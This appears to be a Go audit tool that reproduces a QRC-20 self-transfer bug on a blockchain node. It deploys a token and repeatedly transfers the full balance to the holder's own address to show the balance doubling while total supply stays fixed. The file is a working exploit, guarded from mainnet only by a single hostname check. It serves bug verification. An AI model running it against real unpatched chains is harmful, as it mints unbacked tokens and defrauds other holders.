// Command auditprobe reproduces the QRC-20 self-transfer inflation bug against a
// LIVE node. It deploys a token from the probe wallet, then repeatedly transfers
// the full balance to the holder's own address and reports the balance after
// each round. On an unpatched node the balance doubles every round while
// totalSupply stays constant.
//
// It exits 1 when the bug reproduces and 0 when it does not, so the same
// command is both the "before" proof and the "after" verification: run it
// against each tier before the upgrade to see the mint, and again afterwards to
// see it refused.
//
// Devnet/testnet only — it refuses to run against the mainnet RPC host.
//
//	# one-time: create the probe wallet and print the address to fund
//	go run ./cmd/auditprobe -generate
//
//	# then, once the address holds a little SPLD for fees:
//	go run ./cmd/auditprobe -node https://quantum-rpc-devnet.splendor.org
package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	qcrypto "github.com/splendor-protocol/splendor-quantum-blockchain/core/crypto"
	"github.com/splendor-protocol/splendor-quantum-blockchain/core/types"
	"github.com/splendor-protocol/splendor-quantum-blockchain/vm"
)

var (
	walletPath = flag.String("wallet", "probe.sqwallet", "wallet file")
	password   = flag.String("password", "auditprobe", "wallet password")
	node       = flag.String("node", "https://quantum-rpc-devnet.splendor.org", "node RPC base URL")
	rounds     = flag.Int("rounds", 3, "self-transfer rounds")
	fee        = flag.Int64("fee", 1000, "tx fee in smallest units")
	generate   = flag.Bool("generate", false, "create the probe wallet if absent, print its address, and exit")
)

// minFunding is what the probe needs to run: one deploy plus one transfer per
// round, with slack. Fees are flat, so this is just a fee count.
func minFunding() *big.Int {
	return big.NewInt(*fee * int64(*rounds+4))
}

func main() {
	flag.Parse()
	if strings.Contains(*node, "quantum-rpc.splendor.org") {
		log.Fatal("refusing to run against mainnet")
	}

	if *generate {
		generateWallet()
		return
	}

	pub, priv, err := qcrypto.LoadWallet(*walletPath, []byte(*password))
	if err != nil {
		log.Fatalf("load wallet %s: %v\n(run with -generate to create it)", *walletPath, err)
	}
	me := qcrypto.DeriveAddress(pub)
	fmt.Printf("probe wallet: %s\nnode:         %s\n", me, *node)

	// Fail with a useful message rather than a cryptic tx rejection.
	funds := nativeBalance(me)
	fmt.Printf("balance:      %s units\n\n", funds)
	if funds.Cmp(minFunding()) < 0 {
		log.Fatalf("probe wallet is underfunded: has %s, needs at least %s units for fees.\nSend SPLD to %s and re-run.",
			funds, minFunding(), me)
	}

	// 1. Deploy a QRC-20 with a known supply.
	nonce := mustNonce(me)
	const supply = "1000000"
	deploy := moduleCall("qrc20", "deploy", map[string]any{
		"name": "AuditProbe", "symbol": "APRB", "decimals": 0, "total_supply": supply,
	})
	token := qrc20AddressFor(me, nonce)
	fmt.Printf("deploying QRC-20 (supply %s) as nonce %d -> %s\n", supply, nonce, token)
	submit(buildCall(me, priv, deploy, nonce))
	waitFor(func() bool { return readBalance(token, me) == supply })

	fmt.Printf("\n  round   holder balance   totalSupply\n")
	fmt.Printf("  -----   --------------   -----------\n")
	fmt.Printf("  %5s   %14s   %11s\n", "start", readBalance(token, me), readSupply(token))

	// 2. Self-transfer the entire balance, repeatedly.
	for r := 1; r <= *rounds; r++ {
		bal := readBalance(token, me)
		nonce = mustNonce(me)
		transfer := moduleCall("qrc20", "transfer", map[string]any{
			"token": token.String(), "to": me.String(), "amount": bal,
		})
		submit(buildCall(me, priv, transfer, nonce))
		waitFor(func() bool { return readBalance(token, me) != bal })
		fmt.Printf("  %5d   %14s   %11s\n", r, readBalance(token, me), readSupply(token))
	}

	final, _ := new(big.Int).SetString(readBalance(token, me), 10)
	start, _ := new(big.Int).SetString(supply, 10)
	fmt.Printf("\nholder balance grew %sx while totalSupply stayed %s\n",
		new(big.Int).Div(final, start), readSupply(token))
	if final.Cmp(start) > 0 {
		fmt.Println("REPRODUCED: QRC-20 self-transfer mints tokens")
		os.Exit(1)
	}
	fmt.Println("not reproduced: balance unchanged")
}

// generateWallet creates the probe wallet non-interactively and prints the
// address to fund. The password is a flag, not a prompt, because this key is a
// disposable testnet probe identity that CI and scripts have to be able to
// recreate — never use it for anything that holds value.
func generateWallet() {
	if _, err := os.Stat(*walletPath); err == nil {
		pub, _, err := qcrypto.LoadWallet(*walletPath, []byte(*password))
		if err != nil {
			log.Fatalf("%s already exists but could not be opened: %v", *walletPath, err)
		}
		printFundingInstructions(qcrypto.DeriveAddress(pub), "existing")
		return
	} else if !errors.Is(err, os.ErrNotExist) {
		log.Fatalf("stat %s: %v", *walletPath, err)
	}

	pub, priv, err := qcrypto.GenerateKeypair()
	if err != nil {
		log.Fatalf("generate keypair: %v", err)
	}
	if err := qcrypto.SaveWallet(*walletPath, pub, priv, []byte(*password)); err != nil {
		log.Fatalf("save wallet: %v", err)
	}
	printFundingInstructions(qcrypto.DeriveAddress(pub), "new")
}

func printFundingInstructions(addr qcrypto.Address, kind string) {
	fmt.Printf("%s probe wallet: %s\n", kind, *walletPath)
	fmt.Printf("address:            %s\n", addr)
	fmt.Printf("needs at least:     %s units for fees\n\n", minFunding())
	fmt.Printf("Fund that address, then run:\n  go run ./cmd/auditprobe -node %s\n", *node)
}

// ── chain helpers ────────────────────────────────────────────────────────────

func moduleCall(module, action string, params map[string]any) []byte {
	p, _ := json.Marshal(params)
	b, _ := json.Marshal(vm.ModuleCall{Module: module, Action: action, Params: p})
	return b
}

func buildCall(from qcrypto.Address, priv *qcrypto.PrivateKey, data []byte, nonce uint64) *types.Transaction {
	tx := types.NewCall(from, vm.ModuleRouterAddress, data,
		big.NewInt(0), big.NewInt(*fee), nonce, time.Now().Unix())
	if err := tx.Sign(priv, nonce == 0); err != nil {
		log.Fatalf("sign: %v", err)
	}
	return tx
}

func submit(tx *types.Transaction) {
	body, _ := json.Marshal(tx)
	raw := post("/tx/submit", body)
	var res map[string]any
	json.Unmarshal(raw, &res)
	if e, ok := res["error"]; ok {
		log.Fatalf("tx rejected: %v", e)
	}
}

func readBalance(token, owner qcrypto.Address) string {
	return callString(moduleCall("qrc20", "balance_of", map[string]any{
		"token": token.String(), "owner": owner.String(),
	}), "balance")
}

func readSupply(token qcrypto.Address) string {
	return callString(moduleCall("qrc20", "total_supply", map[string]any{
		"token": token.String(),
	}), "total_supply")
}

// qrc20AddressFor mirrors DeployQRC20Capped's deterministic address derivation:
// SHA3-256(deployer || decimal(nonce) || "qrc20").
func qrc20AddressFor(deployer qcrypto.Address, nonce uint64) qcrypto.Address {
	in := append(deployer[:], []byte(fmt.Sprintf("%d", nonce))...)
	in = append(in, []byte("qrc20")...)
	h := qcrypto.Hash32(in)
	var a qcrypto.Address
	copy(a[:], h[:])
	return a
}

// callString runs a read-only module call through POST /call. Calldata is
// hex-encoded and the module result arrives under "decoded".
func callString(data []byte, field string) string {
	body, _ := json.Marshal(map[string]any{
		"to": vm.ModuleRouterAddress.String(), "data": fmt.Sprintf("%x", data),
	})
	raw := post("/call", body)
	var res struct {
		Decoded map[string]any `json:"decoded"`
		Error   string         `json:"error"`
	}
	if err := json.Unmarshal(raw, &res); err != nil {
		log.Fatalf("decode /call response %q: %v", string(raw), err)
	}
	if res.Error != "" {
		log.Fatalf("/call error: %s", res.Error)
	}
	v, _ := res.Decoded[field].(string)
	return v
}

// nativeBalance reads the account's SPLD balance in smallest units.
func nativeBalance(a qcrypto.Address) *big.Int {
	raw := get("/balance/" + a.String())
	var res struct {
		Balance string `json:"balance"`
		Error   string `json:"error"`
	}
	if err := json.Unmarshal(raw, &res); err != nil {
		log.Fatalf("decode /balance response %q: %v", string(raw), err)
	}
	if res.Error != "" {
		log.Fatalf("/balance error: %s", res.Error)
	}
	v, ok := new(big.Int).SetString(res.Balance, 10)
	if !ok {
		return big.NewInt(0)
	}
	return v
}

func mustNonce(a qcrypto.Address) uint64 {
	raw := get("/nonce/" + a.String())
	var res map[string]any
	json.Unmarshal(raw, &res)
	if v, ok := res["nonce"].(float64); ok {
		return uint64(v)
	}
	return 0
}

func waitFor(cond func() bool) {
	for i := 0; i < 40; i++ {
		if cond() {
			return
		}
		time.Sleep(time.Second)
	}
	log.Fatal("timed out waiting for chain state to change")
}

func get(path string) []byte {
	resp, err := http.Get(*node + path)
	if err != nil {
		log.Fatalf("GET %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return b
}

func post(path string, body []byte) []byte {
	resp, err := http.Post(*node+path, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Fatalf("POST %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return b
}
